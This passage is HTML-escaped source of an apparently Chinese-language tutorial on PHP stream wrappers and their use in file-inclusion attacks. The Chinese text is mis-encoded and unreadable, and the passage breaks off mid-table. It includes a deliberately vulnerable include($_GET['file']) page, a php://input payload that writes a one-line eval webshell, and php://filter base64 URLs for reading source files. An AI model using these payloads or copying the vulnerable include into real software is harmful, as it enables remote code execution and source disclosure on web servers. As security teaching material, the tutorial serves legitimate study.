&lt;/ul&gt;
&lt;h2 id=&#34;php-è¾“å…¥è¾“å‡ºæµ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php-è¾“å…¥è¾“å‡ºæµ&#34;&gt;#&lt;/a&gt; php:// è¾“å…¥è¾“å‡ºæµ&lt;/h2&gt;
&lt;p&gt;PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥ / è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚&lt;/p&gt;
&lt;h2 id=&#34;phpstdin-phpstdout-å’Œ-phpstderr&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpstdin-phpstdout-å’Œ-phpstderr&#34;&gt;#&lt;/a&gt; php://stdin, php://stdout å’Œ php://stderr&lt;/h2&gt;
&lt;p&gt;php://stdinã€php://stdout å’Œ php://stderr å…è®¸ç›´æ¥è®¿é—® PHP è¿›ç¨‹ç›¸åº”çš„è¾“å…¥æˆ–è€…è¾“å‡ºæµã€‚ æ•°æ®æµå¼•ç”¨äº†å¤åˆ¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥å¦‚æœä½ æ‰“å¼€ php://stdin å¹¶åœ¨ä¹‹åå…³äº†å®ƒï¼Œ ä»…æ˜¯å…³é—­äº†å¤åˆ¶å“ï¼ŒçœŸæ­£è¢«å¼•ç”¨çš„ STDIN å¹¶ä¸å—å½±å“ã€‚ æ¨èç®€å•ä½¿ç”¨å¸¸é‡ STDINã€ STDOUT å’Œ STDERR æ¥ä»£æ›¿æ‰‹å·¥æ‰“å¼€è¿™äº›å°è£…å™¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label warning&#34;&gt;php://stdin æ˜¯åªè¯»çš„ï¼Œphp://stdout å’Œ php://stderr æ˜¯åªå†™çš„ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label success&#34;&gt;ğŸ“£ä¸¾ä¾‹&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stdin&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stdin&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//open our file pointer to read from stdin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fgets&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// è¯»å–&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image018.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆè¿›è¡Œè¯»å–&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stdout&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stdout&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$fd&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image019.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
å¯ä»¥çœ‹åˆ°æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆè¿›è¡Œå†™å…¥&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;span class=&#34;label info&#34;&gt;php://stderr&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;php://stderr&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;w&#39;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;lalala&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;fclose&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;image020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆè¿›è¡Œå†™å…¥&lt;/p&gt;
&lt;h2 id=&#34;phpinput&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput&#34;&gt;#&lt;/a&gt; php://input&lt;/h2&gt;
&lt;p&gt;php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚å› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚&lt;br /&gt;
&lt;span class=&#34;label warning&#34;&gt;æ³¨ï¼šenctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpinput-è¯»å–postæ•°æ®&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinput-è¯»å–postæ•°æ®&#34;&gt;#&lt;/a&gt; php://input ï¼ˆè¯»å– POST æ•°æ®ï¼‰&lt;/h3&gt;
&lt;p&gt;ç¢°åˆ° file_get_contents () å°±è¦æƒ³åˆ°ç”¨ php://input ç»•è¿‡ï¼Œå› ä¸º php ä¼ªåè®®ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨ http åè®®çš„ï¼Œå³å¯ä»¥ä½¿ç”¨ POST æ–¹å¼ä¼ æ•°æ®ï¼Œå…·ä½“å‡½æ•°æ„ä¹‰ä¸‹ä¸€é¡¹ï¼›&lt;/p&gt;
&lt;p&gt;æµ‹è¯•ä»£ç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;# 1.phpæ–‡ä»¶&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;php://input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;è®¿é—® &lt;code&gt;http://192.168.199.130/1.php&lt;/code&gt; burp æŠ“åŒ…ï¼Œæ·»åŠ  post æ•°æ®ã€‚&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label&#34;&gt;ç»“æœ&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image021.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpinputå†™é©¬&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinputå†™é©¬&#34;&gt;#&lt;/a&gt; php://input å†™é©¬&lt;/h3&gt;
&lt;p&gt;æµ‹è¯•ä»£ç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;æ¡ä»¶ï¼š&lt;ins&gt;php é…ç½®æ–‡ä»¶ä¸­éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &amp;lt; 5.3.0ï¼‰&lt;/ins&gt;, å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³ POST è¿‡å» PHP ä»£ç ï¼Œå³å¯æ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœ POST çš„æ•°æ®æ˜¯æ‰§è¡Œå†™å…¥ä¸€å¥è¯æœ¨é©¬çš„ PHP ä»£ç ï¼Œå°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªæœ¨é©¬ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php @eval($_POST[cmd])?&amp;gt;&#39;);?&amp;gt;&lt;/code&gt; &lt;br /&gt;
&lt;span class=&#34;lebal info&#34;&gt; å›¾ç‰‡&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image022.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;label info&#34;&gt;å½“ allow_url_include=Off æ—¶æ˜¯ä¸è¡Œçš„&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image023.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;phpinputå‘½ä»¤æ‰§è¡Œ&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpinputå‘½ä»¤æ‰§è¡Œ&#34;&gt;#&lt;/a&gt; php://input å‘½ä»¤æ‰§è¡Œ&lt;/h3&gt;
&lt;p&gt;æµ‹è¯•ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;file&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;æ¡ä»¶ï¼š&lt;ins&gt;php é…ç½®æ–‡ä»¶ä¸­éœ€åŒæ—¶å¼€å¯ allow_url_fopen å’Œ allow_url_includeï¼ˆPHP &amp;lt; 5.30ï¼‰&lt;/ins&gt;, å°±å¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œï¼Œåœ¨è¿™å¯ä»¥ç†è§£æˆè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆRFIï¼‰ï¼Œå³ POST è¿‡å» PHP ä»£ç ï¼Œå³å¯æ‰§è¡Œï¼›&lt;br /&gt;
&lt;span class=&#34;lebal info&#34;&gt;å›¾ç‰‡&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;image024.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;phpfilteræœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#phpfilteræœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–&#34;&gt;#&lt;/a&gt; php://filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰&lt;/h2&gt;
&lt;p&gt;å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äº &amp;quot;æ•°æ®æµæ‰“å¼€&amp;quot; æ—¶çš„ &amp;quot;ç­›é€‰è¿‡æ»¤&amp;quot; åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æ³•ï¼š&lt;br /&gt;
 &lt;code&gt;?filename=php://filter/convert.base64-encode/resource=xxx.php&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;?filename=php://filter/read=convert.base64-encode/resource=xxx.php&lt;/code&gt;  ä¸€æ ·ã€‚&lt;/p&gt;
&lt;p&gt;æ¡ä»¶ï¼šåªæ˜¯è¯»å–ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_includeï¼›&lt;/p&gt;
&lt;p&gt;php://filter å‚æ•°&lt;/p&gt;
&lt;table&gt;
    &lt;tr&gt;
        &lt;th&gt;åç§°&lt;/th&gt;
        &lt;th&gt;æè¿°&lt;/th&gt;
        &lt;th&gt;å¤‡æ³¨&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;resource=&amp;lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&amp;gt;&lt;/td&gt;
        &lt;td&gt;æŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚&lt;/td&gt;
        &lt;td&gt;å¿…é€‰&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;read=&amp;lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&amp;gt;&lt;/td&gt;
        &lt;td&gt;å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚&lt;/td&gt;
        &lt;td&gt;å¯é€‰&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
        &lt;td&gt;write=&amp;lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&amp;gt;&lt;/td&gt;
        &lt;td&gt;å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚&lt;/td&gt;
